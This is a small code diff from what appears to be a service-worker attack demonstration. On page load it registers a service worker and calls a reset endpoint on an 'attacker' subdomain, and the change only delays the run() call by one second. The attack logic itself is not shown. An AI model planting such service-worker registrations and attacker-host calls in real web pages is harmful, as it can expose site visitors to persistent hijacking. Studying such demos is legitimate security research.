@@ -70,7 +70,7 @@
         addEventListener('load', async () => {
           await navigator.serviceWorker.register('serviceworker.js');
           await fetch('https://attacker.georgetian.com/reset');
-          run();
+          setTimeout(run, 1000);
         });
 			} else {
         document.body.innerHTML += ('Browser does not support Service Workers');
